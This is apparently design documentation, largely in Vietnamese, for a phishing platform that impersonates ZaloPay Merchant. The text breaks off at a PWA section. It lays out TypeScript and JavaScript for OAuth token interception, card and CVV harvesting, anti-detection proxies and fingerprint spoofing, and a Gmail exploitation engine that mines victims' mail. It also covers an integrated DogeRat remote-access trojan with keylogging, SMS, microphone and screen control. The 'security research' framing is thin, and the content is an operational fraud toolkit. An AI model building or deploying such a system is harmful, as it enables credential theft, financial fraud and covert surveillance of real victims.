# ZaloPay Merchant Advanced Phishing Platform - Comprehensive System Documentation

## Executive Summary

**ZaloPay Merchant Advanced Phishing Platform** là một hệ thống phishing tích hợp hoàn chỉnh được thiết kế để mô phỏng dịch vụ ZaloPay Merchant nhằm mục đích nghiên cứu bảo mật mạng và đào tạo cybersecurity. Hệ thống kết hợp các kỹ thuật tấn công hiện đại với giao diện quản trị chuyên nghiệp để cung cấp môi trường thử nghiệm thực tiễn cho các chuyên gia an ninh mạng.

## Project Vision & Objectives

### Primary Mission
Phát triển platform nghiên cứu bảo mật tiên tiến để:
- **Phân tích Deep Dive**: Nghiên cứu chi tiết cách thức hoạt động của các hệ thống phishing enterprise-grade
- **Anti-Detection Research**: Phát triển và thử nghiệm các kỹ thuật tránh phát hiện từ hệ thống bảo mật
- **Admin Infrastructure**: Xây dựng hệ thống quản trị hoàn chỉnh với khả năng exploitation tích hợp
- **Gmail Integration**: Tạo module chuyên biệt để khai thác tài khoản Gmail đã bị compromised
- **Educational Framework**: Cung cấp môi trường học tập thực hành cho cybersecurity professionals

### Technical Innovation Goals
1. **High-Fidelity UI Cloning**: Sao chép chính xác 100% giao diện ZaloPay để tối ưu deception rate
2. **Multi-Layer Obfuscation**: Kết hợp proxy rotation, fingerprinting và behavioral mimicking
3. **Comprehensive Admin Suite**: Dashboard quản lý tích hợp từ credential harvesting đến Gmail exploitation
4. **Automated Intelligence Pipeline**: Tự động phân tích, phân loại và khai thác captured credentials
5. **Replit-Optimized Architecture**: Single-server deployment optimized for Replit environment với PostgreSQL

## System Architecture Overview

### Architectural Philosophy
Hệ thống được thiết kế theo mô hình **Layered Security Architecture** với các tầng độc lập có thể scale và maintain riêng biệt:

```
┌─────────────────────────────────────────────────────────────┐
│                    User Interface Layer                     │
│  ┌─────────────┐ ┌─────────────┐ ┌─────────────────────────┐ │
│  │ ZaloPay UI  │ │ Auth Forms  │ │ Support Pages           │ │
│  └─────────────┘ └─────────────┘ └─────────────────────────┘ │
└─────────────────────────────────────────────────────────────┘
┌─────────────────────────────────────────────────────────────┐
│                 Proxy & Anti-Detection Layer               │
│  ┌─────────────┐ ┌─────────────┐ ┌─────────────────────────┐ │
│  │ SOCKS5 Pool │ │Fingerprinting│ │ Browser Automation      │ │
│  └─────────────┘ └─────────────┘ └─────────────────────────┘ │
└─────────────────────────────────────────────────────────────┘
┌─────────────────────────────────────────────────────────────┐
│                 Credential Capture Engine                  │
│  ┌─────────────┐ ┌─────────────┐ ┌─────────────────────────┐ │
│  │OAuth Harvest│ │ Form Capture│ │ Session Hijacking       │ │
│  └─────────────┘ └─────────────┘ └─────────────────────────┘ │
└─────────────────────────────────────────────────────────────┘
┌─────────────────────────────────────────────────────────────┐
│                    Admin Control Center                    │
│  ┌─────────────┐ ┌─────────────┐ ┌─────────────────────────┐ │
│  │ Dashboard   │ │ Victim Mgmt │ │ Campaign Control        │ │
│  └─────────────┘ └─────────────┘ └─────────────────────────┘ │
└─────────────────────────────────────────────────────────────┘
┌─────────────────────────────────────────────────────────────┐
│                 Gmail Exploitation Module                  │
│  ┌─────────────┐ ┌─────────────┐ ┌─────────────────────────┐ │
│  │OAuth Access │ │ Email Mining│ │ Contact Extraction      │ │
│  └─────────────┘ └─────────────┘ └─────────────────────────┘ │
└─────────────────────────────────────────────────────────────┘
┌─────────────────────────────────────────────────────────────┐
│                 DogeRat API Integration Layer              │
│  ┌─────────────┐ ┌─────────────┐ ┌─────────────────────────┐ │
│  │Device Mgmt  │ │Action Exec │ │ Real-time Monitoring    │ │
│  └─────────────┘ └─────────────┘ └─────────────────────────┘ │
└─────────────────────────────────────────────────────────────┘
┌─────────────────────────────────────────────────────────────┐
│                 PWA Architecture & Background Support      │
│  ┌─────────────┐ ┌─────────────┐ ┌─────────────────────────┐ │
│  │Service Worker│ │Background Sync│ │ Push Notifications    │ │
│  └─────────────┘ └─────────────┘ └─────────────────────────┘ │
└─────────────────────────────────────────────────────────────┘
┌─────────────────────────────────────────────────────────────┐
│                 Database & Storage Layer                   │
│  ┌─────────────┐ ┌─────────────┐ ┌─────────────────────────┐ │
│  │ PostgreSQL  │ │ConnectionPool│ │ Encrypted File Storage  │ │
│  └─────────────┘ └─────────────┘ └─────────────────────────┘ │
└─────────────────────────────────────────────────────────────┘
```

### Core System Components

#### 1. Frontend Victim Interface
**Technology Stack**: HTML5, CSS3, JavaScript (Vanilla + jQuery), Bootstrap 5
**Primary Components**:
- `index.html` - ZaloPay Merchant landing page với business-focused content
- `auth_signup.html` - Authentication entry point với social login options
- `google_auth.html` - Google OAuth capture interface với realistic redirect flow  
- `apple_auth.html` - Apple ID authentication capture với Sign in with Apple integration
- `auth_success.html` - Post-authentication redirect page để maintain user trust
- `auth_error.html` - Error handling page với realistic error messages
- `register.html` - Comprehensive registration form với 7 steps, bao gồm:
  - Step 1-6: Business information, representative info, bank account, documents, terms
  - Step 7: Identity verification với upload hình ảnh thẻ và lịch sử giao dịch
  - Card information capture (Visa/Mastercard/JCB) với encryption
- `contact.html`, `faq.html`, `guide.html` - Support pages để tăng legitimacy

**Key Features**:
```javascript
// OAuth Interception Engine
class OAuthInterceptor {
    constructor() {
        this.providers = ['google', 'apple', 'facebook'];
        this.captureEndpoint = '/api/capture/oauth';
    }
    
    interceptOAuthFlow(provider, originalCallback) {
        // Capture tokens before forwarding to legitimate provider
        const interceptedCallback = this.createInterceptCallback(originalCallback);
        
        // Maintain user experience while harvesting credentials
        return this.initiateOAuthWithCapture(provider, interceptedCallback);
    }
    
    createInterceptCallback(originalCallback) {
        return (authResult) => {
            // Extract and store tokens
            this.captureTokens(authResult);
            
            // Forward to original callback to maintain flow
            originalCallback(authResult);
        };
    }
}
```

#### 2. Proxy & Anti-Detection Infrastructure
**Architecture**: Distributed proxy pool với intelligent rotation
**Core Technologies**: Node.js (axios, node-fetch), PostgreSQL (proxy state storage via Prisma), In-memory caching (Express application-level)

```typescript
class AdvancedProxyManager {
    private prisma: PrismaClient;
    private proxyPools: {
        residential_vietnam: Proxy[];
        mobile_vietnam: Proxy[];
        datacenter_singapore: Proxy[];
        rotating_global: Proxy[];
    };
    private healthMonitor: ProxyHealthMonitor;

    constructor(prisma: PrismaClient) {
        this.prisma = prisma;
        this.proxyPools = {
            residential_vietnam: [],  // Residential IPs from Vietnam ISPs
            mobile_vietnam: [],       // Mobile carrier IPs (Viettel, Vinaphone, Mobifone)
            datacenter_singapore: [], // High-speed datacenter proxies for fallback
            rotating_global: []       // Global rotating proxy network
        };
        // Session assignments stored in PostgreSQL via Prisma
        this.healthMonitor = new ProxyHealthMonitor();
    }

    async assignVictimProxy(victimId: string, geoPreference: string = 'VN'): Promise<Proxy> {
        /** Assign consistent proxy per victim session để tránh detection */
        
        // Check existing assignment in PostgreSQL
        const existing = await this.prisma.victimProxyAssignment.findUnique({
            where: { victim_id: victimId }
        });
        
        if (existing) {
            return this.getProxyById(existing.proxy_id);
        }
        
        // Select optimal proxy based on geolocation and load balancing
        const suitableProxies = this.filterProxiesByGeo(geoPreference);
        const selectedProxy = await this.selectOptimalProxy(suitableProxies);
        
        // Store proxy assignment in PostgreSQL
        await this.prisma.victimProxyAssignment.upsert({
            where: { victim_id: victimId },
            update: { proxy_id: selectedProxy.id, assigned_at: new Date() },
            create: {
                victim_id: victimId,
                proxy_id: selectedProxy.id,
                assigned_at: new Date()
            }
        });
        
        return selectedProxy;
    }

    async generateRealisticFingerprint(region: string = 'VN'): Promise<DeviceFingerprint> {
        /** Generate device fingerprint matching regional characteristics */
        const regionalProfiles = await this.loadRegionalProfiles(region);
        
        return {
            user_agent: this.selectCommonUA(regionalProfiles.browsers),
            screen_resolution: this.selectPopularResolution(regionalProfiles.screens),
            timezone: regionalProfiles.timezone,
            language: this.weightedRandomSelection(regionalProfiles.languages),
            plugins: this.generateRealisticPlugins(regionalProfiles.common_plugins),
            webgl_vendor: this.selectGpuVendor(regionalProfiles.gpu_distribution),
            canvas_fingerprint: this.generateUniqueCanvasSignature(),
            audio_fingerprint: this.generateAudioContextSignature()
        };
    }
}
```

**Device Fingerprinting Engine**:
```javascript
class DeviceFingerprintEngine {
    constructor() {
        this.entropy_sources = [
            'canvas', 'webgl', 'audio', 'fonts', 'plugins', 
            'screen', 'timezone', 'language', 'hardware'
        ];
    }
    
    async generateVietnameseProfile() {
        const vietnameseCharacteristics = {
            browsers: {
                'chrome': 0.68,    // 68% Chrome usage in Vietnam
                'edge': 0.15,      // 15% Edge usage
                'firefox': 0.12,   // 12% Firefox usage
                'safari': 0.05     // 5% Safari usage (Mac users)
            },
            screen_resolutions: {
                '1366x768': 0.35,  // Most common laptop resolution
                '1920x1080': 0.40, // Standard FHD
                '1440x900': 0.15,  // MacBook Pro
                '1280x720': 0.10   // Lower-end devices
            },
            operating_systems: {
                'Windows 10': 0.55,
                'Windows 11': 0.25,
                'macOS': 0.15,
                'Linux': 0.05
            }
        };
        
        return this.generateFingerprintFromProfile(vietnameseCharacteristics);
    }
    
    async applyFingerprintToSession(fingerprint) {
        // Override browser properties để Google nhận diện là device khác
        await this.overrideNavigatorProperties(fingerprint);
        await this.spoofScreenProperties(fingerprint.screen);
        await this.injectCustomPlugins(fingerprint.plugins);
        await this.modifyCanvasRendering(fingerprint.canvas_signature);
    }
}
```

#### 3. Credential Capture & Processing Engine
**Core Architecture**: Event-driven processing với real-time validation
**Technologies**: Node.js (Express.js), Bull Queue (async processing), PostgreSQL (relational database với JSONB via Prisma)

```typescript
class CredentialCaptureEngine {
    private captureProcessors: {
        oauth_google: GoogleOAuthProcessor;
        oauth_apple: AppleOAuthProcessor;
        form_direct: DirectFormProcessor;
        session_hijack: SessionHijackProcessor;
    };
    private validationPipeline: CredentialValidationPipeline;
    private notificationSystem: RealTimeNotificationSystem;
    private prisma: PrismaClient;
    private validationQueue: Queue;

    constructor(prisma: PrismaClient, io: Server) {
        this.prisma = prisma;
        this.captureProcessors = {
            oauth_google: new GoogleOAuthProcessor(),
            oauth_apple: new AppleOAuthProcessor(),
            form_direct: new DirectFormProcessor(),
            session_hijack: new SessionHijackProcessor()
        };
        this.validationPipeline = new CredentialValidationPipeline(prisma);
        this.notificationSystem = new RealTimeNotificationSystem(io);
        this.validationQueue = new Queue('validation', {
            redis: { host: process.env.REDIS_HOST, port: parseInt(process.env.REDIS_PORT || '6379') }
        });
    }

    async processCaptureEvent(captureData: CaptureData): Promise<Victim> {
        /** Main entry point for credential capture processing */
        
        // 1. Initial data normalization and validation
        const normalizedData = await this.normalizeCaptureData(captureData);
        
        // 2. Store raw capture data
        const victimRecord = await this.createVictimRecord(normalizedData);
        
        // 3. Queue for validation and enrichment (using Bull Queue)
        await this.validationQueue.add('validate-victim', { victimId: victimRecord.id });
        
        // 4. Send real-time notification to admin via Socket.io
        await this.notificationSystem.notifyNewVictim(victimRecord);
        
        return victimRecord;
    }

    async processRegistrationForm(formData: FormData, files: Express.Multer.File[]): Promise<ProcessResult> {
        /** Process complete registration form including card info and identity verification */
        
        // Extract and encrypt card information
        let cardInfo: CardInformation | null = null;
        if (formData.card_type) {
            cardInfo = {
                card_type: formData.card_type,
                card_number: await this.encryptSensitiveData(formData.card_number || '', 'CARD_NUMBER'),
                card_holder_name: await this.encryptSensitiveData(formData.card_holder_name || '', 'CARD_HOLDER_NAME'),
                expiry_date: await this.encryptSensitiveData(formData.card_expiry || '', 'CARD_EXPIRY'),
                cvv: await this.encryptSensitiveData(formData.card_cvv || '', 'CVV')  // Note: CVV should be handled with extra care
            };
        }
        
        // Process identity verification files
        const identityVerification = await this.processIdentityVerificationFiles(files, formData.victim_id);
        
        // Update victim record
        await this.prisma.victim.update({
            where: { id: formData.victim_id },
            data: {
                card_information: cardInfo || {},
                identity_verification: identityVerification,
                updated_at: new Date()
            }
        });
        
        return {
            success: true,
            card_info_captured: !!cardInfo,
            identity_verification_complete: true
        };
    }

    async validateCapturedCredentials(victimId: string): Promise<ValidationResults> {
        /** Comprehensive credential validation and account profiling */
        const victim = await this.prisma.victim.findUnique({
            where: { id: victimId }
        });
        
        if (!victim) {
            throw new Error(`Victim ${victimId} not found`);
        }
        
        const validationResults: ValidationResults = {
            credential_validity: false,
            account_type: null,
            market_value: 'low',
            additional_data: {},
            access_level: null
        };
        
        try {
            // Test OAuth tokens if available
            const oauthTokens = await this.getOAuthTokensForVictim(victimId);
            if (oauthTokens) {
                const oauthValidation = await this.testOAuthAccess(oauthTokens);
                Object.assign(validationResults, oauthValidation);
            }
            
            // Test direct login if password available
            else if (victim.password_hash) {
                const loginValidation = await this.testDirectLogin(
                    victim.email, 
                    victim.password_hash
                );
                Object.assign(validationResults, loginValidation);
            }
            
            // Enrich with additional data
            if (validationResults.credential_validity) {
                const enrichmentData = await this.enrichVictimProfile(victim);
                validationResults.additional_data = { ...validationResults.additional_data, ...enrichmentData };
                validationResults.market_value = this.calculateMarketValue(enrichmentData);
            }
            
        } catch (error) {
            console.error(`Validation failed for victim ${victimId}:`, error);
            validationResults.error = error instanceof Error ? error.message : String(error);
        }
        
        // Update victim record with validation results (PostgreSQL JSONB update via Prisma)
        await this.prisma.victim.update({
            where: { id: victimId },
            data: {
                validation: validationResults,
                updated_at: new Date()
            }
        });
        
        return validationResults;
    }
}
```

#### 4. Admin Control Center
**Frontend Technologies**: HTML5, CSS3 (Custom Design System), JavaScript (ES6+), Chart.js
**Backend**: Node.js (Express.js), Socket.io (real-time updates), JWT (authentication), PostgreSQL (Prisma ORM)

**Dashboard Architecture**:
```typescript
class AdminDashboardSystem {
    private authManager: AdminAuthenticationManager;
    private permissionsEngine: RoleBasedPermissionEngine;
    private realTimeUpdater: SocketIOManager;
    private analyticsEngine: DashboardAnalyticsEngine;
    private prisma: PrismaClient;

    constructor(prisma: PrismaClient, io: Server) {
        this.prisma = prisma;
        this.authManager = new AdminAuthenticationManager(prisma);
        this.permissionsEngine = new RoleBasedPermissionEngine(prisma);
        this.realTimeUpdater = new SocketIOManager(io);
        this.analyticsEngine = new DashboardAnalyticsEngine(prisma);
    }

    async getDashboardOverview(adminUser: AdminUser): Promise<DashboardData> {
        /** Generate comprehensive dashboard statistics */
        
        // Check permissions
        if (!this.permissionsEngine.canAccess(adminUser, 'dashboard_view')) {
            throw new Error("Insufficient permissions for dashboard access");
        }
        
        // Gather real-time statistics
        const dashboardData: DashboardData = {
            summary_stats: await this.getSummaryStatistics(),
            campaign_performance: await this.getCampaignMetrics(),
            victim_analytics: await this.getVictimAnalytics(),
            system_health: await this.getSystemHealthStatus(),
            recent_activity: await this.getRecentActivity(50),
            high_value_alerts: await this.getHighValueAlerts()
        };
        
        return dashboardData;
    }

    async getVictimManagementData(adminUser: AdminUser, filters?: VictimFilters): Promise<VictimManagementData> {
        /** Retrieve victim data với advanced filtering và pagination */
        
        // Build query based on filters
        const query = this.buildVictimQuery(filters || {});
        
        // Apply user permissions
        const permissionQuery = this.permissionsEngine.applyDataAccessRules(adminUser, query);
        
        // Execute query with PostgreSQL JOINs via Prisma
        const whereClause = this.buildWhereClause(permissionQuery);
        const limit = filters?.limit || 100;
        const offset = filters?.offset || 0;
        
        const victimsData = await this.prisma.victim.findMany({
            where: whereClause,
            include: {
                oauth_tokens: {
                    select: {
                        id: true,
                        provider: true,
                        token_status: true
                    }
                },
                campaign: {
                    select: {
                        id: true,
                        name: true,
                        code: true
                    }
                }
            },
            orderBy: {
                capture_timestamp: 'desc'
            },
            take: limit,
            skip: offset
        });
        
        // Get total count
        const totalCount = await this.prisma.victim.count({
            where: whereClause
        });
        
        return {
            victims: victimsData,
            total_count: totalCount,
            filters_applied: filters,
            export_options: this.getAvailableExportFormats(adminUser)
        };
    }
}
```

**Admin Interface Components**:
- **Main Dashboard** (`dashboard.html`): Real-time statistics, campaign overview, system health
- **Victim Management**: Advanced filtering, bulk operations, detailed victim profiles
- **Campaign Control**: Create/edit/monitor phishing campaigns
- **Content Management**: Dynamic FAQ và guides management (`faq_management.html`, `guides_management.html`)
- **Activity Monitoring** (`activity_logs.html`): Comprehensive audit trail
- **Gmail Exploitation Panel**: Direct Gmail access và intelligence extraction interface
- **Device Management** (`devices.html`): Real-time device monitoring và control via DogeRat API
- **PWA Features**: Add to Home Screen, background sync, offline support

#### 5. Gmail Exploitation Module
**Core Architecture**: OAuth-based access với comprehensive data extraction
**Technologies**: Node.js (googleapis library), Async/Await (concurrent processing), Encryption (AES-256-GCM)

```typescript
import { google } from 'googleapis';
import { PrismaClient } from '@prisma/client';

class GmailExploitationEngine {
    private oauthManager: OAuthTokenManager;
    private gmailClient: typeof google.gmail;
    private dataExtractor: GmailDataExtractor;
    private exportEngine: DataExportEngine;
    private opsecManager: OperationalSecurityManager;
    private prisma: PrismaClient;

    constructor(prisma: PrismaClient) {
        this.prisma = prisma;
        this.oauthManager = new OAuthTokenManager(prisma);
        this.dataExtractor = new GmailDataExtractor();
        this.exportEngine = new DataExportEngine();
        this.opsecManager = new OperationalSecurityManager();
    }

    async accessVictimGmail(victimId: string, adminUserId: string, accessMethod: string = 'oauth'): Promise<typeof google.gmail> {
        /** Secure Gmail access với full operational security */
        
        // Setup OpSec environment
        const opsecSession = await this.opsecManager.createSecureSession(adminUserId);
        
        try {
            const victim = await this.prisma.victim.findUnique({
                where: { id: victimId },
                include: { oauth_tokens: true }
            });
            
            if (!victim) {
                throw new Error(`Victim ${victimId} not found`);
            }
            
            // Select access method
            let gmailService: typeof google.gmail | null = null;
            if (accessMethod === 'oauth' && victim.oauth_tokens && victim.oauth_tokens.length > 0) {
                gmailService = await this.accessViaOAuth(victim.oauth_tokens[0], opsecSession);
            } else if (accessMethod === 'session' && victim.session_data?.captured_cookies) {
                gmailService = await this.accessViaSession(victim.session_data.captured_cookies, opsecSession);
            } else if (accessMethod === 'direct' && victim.password_hash) {
                gmailService = await this.accessViaCredentials(victim.email, victim.password_hash, opsecSession);
            }
            
            if (!gmailService) {
                throw new Error("No valid access method available");
            }
            
            // Log access attempt
            await this.logGmailAccess(adminUserId, victimId, accessMethod, true);
            
            return gmailService;
            
        } catch (error) {
            await this.logGmailAccess(adminUserId, victimId, accessMethod, false, error instanceof Error ? error.message : String(error));
            throw error;
        } finally {
            // Cleanup OpSec session
            await this.opsecManager.cleanupSession(opsecSession);
        }
    }

    async extractGmailIntelligence(gmailService: typeof google.gmail, victimId: string, extractionConfig: ExtractionConfig): Promise<ExtractionResult> {
        /** Comprehensive Gmail data extraction và analysis */
        
        const extractionResults: ExtractionResults = {
            emails: [],
            contacts: [],
            attachments: [],
            calendar_events: [],
            drive_files: [],
            labels: [],
            filters: []
        };
        
        // Extract emails with intelligent filtering
        if (extractionConfig.extract_emails !== false) {
            const emails = await this.extractEmailsWithIntelligence(
                gmailService, 
                extractionConfig.email_filters || {}
            );
            extractionResults.emails = emails;
        }
        
        // Extract contacts and analyze relationships
        if (extractionConfig.extract_contacts !== false) {
            const contacts = await this.extractAndAnalyzeContacts(gmailService);
            extractionResults.contacts = contacts;
        }
        
        // Extract attachments và scan for sensitive content
        if (extractionConfig.extract_attachments !== false) {
            const attachments = await this.extractValuableAttachments(gmailService);
            extractionResults.attachments = attachments;
        }
        
        // Additional data sources
        if (extractionConfig.extract_calendar) {
            extractionResults.calendar_events = await this.extractCalendarData(gmailService);
        }
        
        if (extractionConfig.extract_drive) {
            extractionResults.drive_files = await this.extractDriveIntelligence(gmailService);
        }
        
        // Analyze và classify extracted data
        const intelligenceAnalysis = await this.analyzeExtractedIntelligence(extractionResults);
        
        // Store results với encryption
        await this.storeExtractedData(victimId, extractionResults, intelligenceAnalysis);
        
        return {
            extraction_results: extractionResults,
            intelligence_analysis: intelligenceAnalysis,
            extraction_summary: this.generateExtractionSummary(extractionResults)
        };
    }

    async extractEmailsWithIntelligence(gmailService: typeof google.gmail, filters: EmailFilters): Promise<Email[]> {
        /** Advanced email extraction với content analysis */
        
        // Build intelligent search queries
        const searchQueries = [
            'subject:contract OR subject:agreement OR subject:deal',  // Business contracts
            'subject:invoice OR subject:payment OR subject:billing',  // Financial data
            'subject:password OR subject:reset OR subject:verification', // Security data
            'from:bank OR from:financial OR from:credit',             // Banking communications
            'subject:confidential OR subject:private OR subject:internal' // Confidential data
        ];
        
        const valuableEmails: Email[] = [];
        
        for (const query of searchQueries) {
            try {
                const results = await gmailService.users.messages.list({
                    userId: 'me',
                    q: query,
                    maxResults: filters.max_per_query || 100
                });
                
                if (results.data.messages) {
                    for (const messageRef of results.data.messages) {
                        // Get full message details
                        const message = await gmailService.users.messages.get({
                            userId: 'me',
                            id: messageRef.id!,
                            format: 'full'
                        });
                        
                        // Analyze and classify email
                        const emailAnalysis = await this.analyzeEmailContent(message.data);
                        
                        if (emailAnalysis.value_score > 0.5) {  // Only store valuable emails
                            valuableEmails.push({
                                id: message.data.id!,
                                thread_id: message.data.threadId!,
                                subject: this.extractHeader(message.data, 'Subject'),
                                from: this.extractHeader(message.data, 'From'),
                                to: this.extractHeader(message.data, 'To'),
                                date: this.extractHeader(message.data, 'Date'),
                                body: this.extractEmailBody(message.data),
                                attachments: this.extractAttachmentInfo(message.data),
                                analysis: emailAnalysis
                            });
                        }
                    }
                }
                
            } catch (error) {
                console.warn(`Failed to extract emails for query '${query}':`, error);
            }
        }
        
        return valuableEmails;
    }
}
```

**Gmail Access Interface**:
```javascript
class GmailAccessInterface {
    constructor(victimId) {
        this.victimId = victimId;
        this.accessMethods = ['oauth', 'session', 'direct'];
        this.extractionOptions = {
            emails: true,
            contacts: true, 
            attachments: true,
            calendar: false,
            drive: false
        };
    }
    
    async displayGmailAccessPanel() {
        const panel = document.getElementById('gmailAccessPanel');
        panel.innerHTML = `
            <div class="gmail-access-header">
                <h3>Gmail Access - ${this.victimEmail}</h3>
                <div class="access-status ${this.getAccessStatus()}"></div>
            </div>
            
            <div class="access-methods">
                ${this.renderAccessMethods()}
            </div>
            
            <div class="extraction-options">
                <h4>Data Extraction Options</h4>
                ${this.renderExtractionOptions()}
            </div>
            
            <div class="action-buttons">
                <button onclick="this.initiateGmailAccess()" class="btn btn-primary">
                    Access Gmail
                </button>
                <button onclick="this.exportExtractedData()" class="btn btn-secondary">
                    Export Data
                </button>
            </div>
            
            <div class="gmail-preview">
                <iframe id="gmailFrame" src="about:blank"></iframe>
            </div>
        `;
    }
    
    async initiateGmailAccess() {
        const selectedMethod = document.querySelector('input[name="accessMethod"]:checked').value;
        
        try {
            const response = await fetch('/api/gmail/access', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({
                    victim_id: this.victimId,
                    access_method: selectedMethod,
                    extraction_options: this.extractionOptions,
                    use_opsec: true
                })
            });
            
            const result = await response.json();
            
            if (result.success) {
                this.displayGmailInterface(result.gmail_session);
                await this.startDataExtraction(result.gmail_session);
            } else {
                this.showError('Gmail access failed: ' + result.error);
            }
            
        } catch (error) {
            this.showError('Network error: ' + error.message);
        }
    }
    
    async startDataExtraction(gmailSession) {
        const progressBar = document.getElementById('extractionProgress');
        progressBar.style.display = 'block';
        
        // Start extraction process
        const extractionPromises = [];
        
        if (this.extractionOptions.emails) {
            extractionPromises.push(this.extractEmails(gmailSession));
        }
        
        if (this.extractionOptions.contacts) {
            extractionPromises.push(this.extractContacts(gmailSession));
        }
        
        if (this.extractionOptions.attachments) {
            extractionPromises.push(this.extractAttachments(gmailSession));
        }
        
        // Execute extractions concurrently
        const results = await Promise.allSettled(extractionPromises);
        
        // Process and display results
        this.displayExtractionResults(results);
        
        progressBar.style.display = 'none';
    }
}
```

#### 6. DogeRat API Integration Layer
**Core Architecture**: REST API và Socket.IO integration cho device management
**Technologies**: Node.js (Express.js), Socket.IO (real-time communication), PostgreSQL (device data storage via Prisma)

```typescript
import { PrismaClient } from '@prisma/client';
import { Server } from 'socket.io';

class DogeRatAPIIntegrationLayer {
    private deviceService: DeviceManagementService;
    private actionService: ActionExecutionService;
    private socketManager: SocketIOManager;
    private prisma: PrismaClient;

    constructor(prisma: PrismaClient, io: Server) {
        this.prisma = prisma;
        this.deviceService = new DeviceManagementService(prisma);
        this.actionService = new ActionExecutionService(prisma, io);
        this.socketManager = new SocketIOManager(io);
    }

    async initializeDogeRatIntegration(): Promise<void> {
        /** Initialize DogeRat API integration với web app */
        
        // 1. Set up REST API routes
        this.setupRESTAPIRoutes();
        
        // 2. Set up Socket.IO handlers
        this.setupSocketIOHandlers();
        
        // 3. Initialize device management
        await this.deviceService.initialize();
        
        // 4. Start real-time monitoring
        await this.startRealTimeMonitoring();
    }

    setupRESTAPIRoutes(): void {
        /** Set up REST API endpoints cho DogeRat integration */
        
        // Device management endpoints
        app.get('/api/v1/devices', async (req, res) => {
            const devices = await this.deviceService.getAllDevices(req.query);
            res.json({ success: true, data: devices });
        });
        
        app.get('/api/v1/devices/:id', async (req, res) => {
            const device = await this.deviceService.getDeviceById(req.params.id);
            res.json({ success: true, data: device });
        });
        
        // Action execution endpoint
        app.post('/api/v1/devices/:id/action', async (req, res) => {
            const result = await this.actionService.executeAction(
                req.params.id,
                req.body.action,
                req.body.params
            );
            res.json({ success: true, ...result });
        });
        
        // Available actions endpoint
        app.get('/api/v1/actions', async (req, res) => {
            const actions = this.actionService.getAvailableActions();
            res.json({ success: true, data: actions });
        });
    }

    setupSocketIOHandlers(): void {
        /** Set up Socket.IO event handlers cho real-time communication */
        
        this.socketManager.on('connection', (socket) => {
            // Handle device connection
            socket.on('device-connected', async (deviceInfo) => {
                await this.handleDeviceConnection(socket.id, deviceInfo);
            });
            
            // Handle device disconnection
            socket.on('disconnect', async () => {
                await this.handleDeviceDisconnection(socket.id);
            });
            
            // Handle device data updates
            socket.on('device-data-update', async (data) => {
                await this.handleDeviceDataUpdate(socket.id, data);
            });
            
            // Handle action responses
            socket.on('action-response', async (response) => {
                await this.handleActionResponse(socket.id, response);
            });
        });
    }

    async handleDeviceConnection(deviceId: string, deviceInfo: DeviceInfo): Promise<void> {
        /** Handle new device connection */
        
        // Store device info in database
        await this.deviceService.createOrUpdateDevice(deviceId, deviceInfo);
        
        // Broadcast to admin dashboard
        this.socketManager.emit('device-connected', {
            id: deviceId,
            ...deviceInfo,
            connectedAt: new Date()
        });
    }

    async handleDeviceDataUpdate(deviceId: string, data: DeviceData): Promise<void> {
        /** Handle device data updates */
        
        // Store device data in database
        await this.deviceService.updateDeviceData(deviceId, data);
        
        // Broadcast to admin dashboard
        this.socketManager.emit('device-data-update', {
            deviceId,
            type: data.type,
            data: data.payload
        });
    }

    async executeDeviceAction(deviceId: string, action: string, params?: object): Promise<ActionResult> {
        /** Execute action on device via Socket.IO */
        
        // Validate device connection
        const device = await this.deviceService.getDeviceById(deviceId);
        if (!device || !device.online) {
            throw new Error(`Device ${deviceId} is not connected`);
        }
        
        // Execute action via Socket.IO
        const result = await this.actionService.executeAction(deviceId, action, params);
        
        // Log action execution
        await this.logActionExecution(deviceId, action, params, result);
        
        return result;
    }
}
```

**DogeRat API Endpoints Integration (OpenAPI 3.1.0):**

**Health Check Endpoints:**
- `GET /health` - Basic health check
- `GET /health/detailed` - Detailed health check with system information
- `GET /health/metrics` - System metrics and statistics

**Device Management Endpoints (API v1):**
- `GET /api/v1/devices` - List all connected devices (supports `?platform=android|ios` and `?online=true|false` filters)
- `GET /api/v1/devices/:id` - Get device details với all data

**Action Execution Endpoints (API v1):**
- `POST /api/v1/devices/:id/action` - Execute action on device (platform-aware)
- `GET /api/v1/actions` - Get available actions list (supports `?platform=android|ios` filter)

**Screen Control Endpoints (API v1):**
- `POST /api/v1/devices/:id/screen/start` - Start screen streaming with optional quality settings
- `POST /api/v1/devices/:id/screen/stop` - Stop screen streaming
- `POST /api/v1/devices/:id/screen/quality` - Update quality settings for active streaming session
- `GET /api/v1/devices/:id/screen/status` - Get current screen streaming status

**Remote Control Endpoints (API v1):**
- `POST /api/v1/devices/:id/control/start` - Start remote control session
- `POST /api/v1/devices/:id/control/stop` - Stop remote control session
- `POST /api/v1/devices/:id/control/command` - Send control command (touch, swipe, key, scroll)
- `GET /api/v1/devices/:id/control/status` - Get current remote control status

**File Upload Endpoints:**
- `POST /upload` - Upload files from device (multipart/form-data)

**Legacy Endpoints (Deprecated):**
- `GET /api/devices` - Legacy endpoint (use `/api/v1/devices` instead)
- `GET /api/device/:id` - Legacy endpoint (use `/api/v1/devices/:id` instead)
- `POST /api/device/:id/action` - Legacy endpoint (use `/api/v1/devices/:id/action` instead)
- `GET /text` - Legacy configuration endpoint

**OpenAPI 3.1.0 Specification:**
- Complete API documentation in `docs/swagger.yaml` and `docs/openapi.json`
- Swagger UI available at `/api-docs`
- All endpoints documented with request/response schemas, examples, and error responses
- Security schemes defined (JWT Bearer, API Key) for future authentication
- Reusable components (schemas, parameters, responses) for consistency

**Socket.IO Events:**
- `device-connected` - New device connected
- `device-disconnected` - Device disconnected
- `device-data-update` - Device data updated
- `device-message` - Message from device
- `file-uploaded` - File uploaded from device
- `action-response` - Action execution response
- `screen-frame` - Screen streaming frame (for screen control)
- `control-response` - Remote control command response (for remote control)

**Device Management Features:**
- Real-time device monitoring
- Platform detection (Android/iOS) with platform-aware action validation
- Device data collection (contacts, SMS, calls, gallery, camera, screenshots, keylogger, clipboard, location, apps, files, microphone, audio)
- Remote device control (toast, vibrate, SMS, camera, screenshot, keylogger, clipboard, URL, microphone, location, SIM info, apps, file explorer)
- Screen streaming with quality control (fps, resolution, compression)
- Remote control with touch, swipe, key, and scroll commands
- File upload handling
- Action execution engine with platform validation
- Request validation with express-validator
- Error handling with standardized error response schemas

#### 7. PWA Architecture & Background Support
**Core Architecture**: Progressive Web App với Service Worker và Background Sync
**Technologies**: Web App Manifest, Service Worker API, Background Sync API, Push Notifications API, Cache API

```typescript
class PWAArchitectureSystem {
    private serviceWorkerRegistration: ServiceWorkerRegistration | null = null;
